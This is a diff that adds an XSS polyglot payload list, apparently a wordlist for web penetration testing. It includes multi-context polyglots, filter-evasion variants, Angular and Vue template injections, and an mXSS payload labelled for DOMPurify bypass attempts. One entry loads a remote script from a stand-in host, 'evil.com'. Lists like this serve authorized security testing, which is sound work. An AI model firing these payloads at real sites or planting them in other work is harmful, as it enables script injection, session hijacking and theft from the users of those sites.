@@ -1,0 +1,162 @@
+# XSS - Polyglot Payloads
+# Single payloads that work in multiple contexts
+# Execute in HTML, JS, URL, attribute contexts
+
+# Ultimate polyglots
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+'">><marquee><img src=x onerror=confirm(1)></marquee></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telefonos;telefonos;)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+
+'">><script>alert(document.domain)</script>
+
+-->'"/></sCript><deTailS open oNtoGgle=alert(document.domain)>
+
+'`"><\x00telefonos>%00telefonos%0d%0a
+
+<img/src=`x`onerror=alert(1)>
+
+<img src=x onerror="alert(1)">
+
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+
+<style/onload=alert(1)>
+
+jaVasCript:alert(1)
+
+<script>alert(1)</script>
+
+<script/src="//evil.com/xss.js">
+
+<iframe src=javascript:alert(1)>
+
+<SCRIPT>alert(1)</SCRIPT>
+
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+<ScRipT>alert(1)</sCriPt>
+
+<script>alert(1)// 
+
+<script>alert(1)<!--
+
+<script>alert(1)%0A-->
+
+<script>alert(1)</script
+
+<script>alert(1)</script 
+
+<script/anything>alert(1)</script>
+
+<svg/onload=alert(1)>
+
+<svg onload=alert(1)//
+
+<svg onload="alert(1)"
+
+<svg/onload="alert(1)">
+
+<svg/onload=`alert(1)`>
+
+<svg onload=alert&lpar;1&rpar;>
+
+<body onload=alert(1)>
+
+<input onfocus=alert(1) autofocus>
+
+<input/onfocus=alert(1) autofocus>
+
+<marquee onstart=alert(1)>
+
+<marquee behavior="alternate" onbounce=alert(1)>
+
+<video src=x onerror=alert(1)>
+
+<video><source onerror=alert(1)>
+
+<audio src=x onerror=alert(1)>
+
+<details/open/ontoggle=alert(1)>
+
+<meter onmouseover="alert(1)"
+
+<keygen onfocus=alert(1) autofocus>
+
+<select onfocus=alert(1) autofocus>
+
+<textarea onfocus=alert(1) autofocus>
+
+<frameset onload=alert(1)>
+
+<img src=x:alert(alt) onerror=eval(src) alt=1>
+
+<body/onpageshow=alert(1)>
+
+<img src="1" onerror="alert(1)">
+
+<script x> alert(1) </script 1=2
+
+<script x>alert(1)</script>
+
+<script/x>alert(1)</script>
+
+"><script>alert(String.fromCharCode(66))</script>
+
+# Context-specific polyglots
+
+# Works in: script, style, attribute, comment
+--></style></script><script>alert(1)//
+
+# Works in: HTML and JS string
+</script><script>alert(1)</script>
+
+# Works in: single and double quoted attributes
+' onclick=alert(1) x=' " onclick=alert(1) x="
+
+# Works in: URL and HTML
+javascript:/**/alert(1)
+
+# Works in: JSON and JS
+{"a":"</script><script>alert(1)//"}
+
+# Works in: XML and HTML
+<![CDATA[<script>alert(1)</script>]]>
+
+# Mini polyglots for testing
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+`onmouseover=alert(1) x=`
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# Angular specific polyglot
+{{constructor.constructor('alert(1)')()}}
+
+# Vue specific polyglot
+{{_c.constructor('alert(1)')()}}
+
+# React/JSX context
+{alert(1)}
+{constructor.constructor('alert(1)')()}
+
+# Template literal polyglot
+${alert(1)}
+`${alert(1)}`
+
+# mXSS polyglot for DOMPurify bypass attempts
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+
+# Event handler polyglot
+onmouseover=alert(1)// onclick=alert(1)// onfocus=alert(1)//
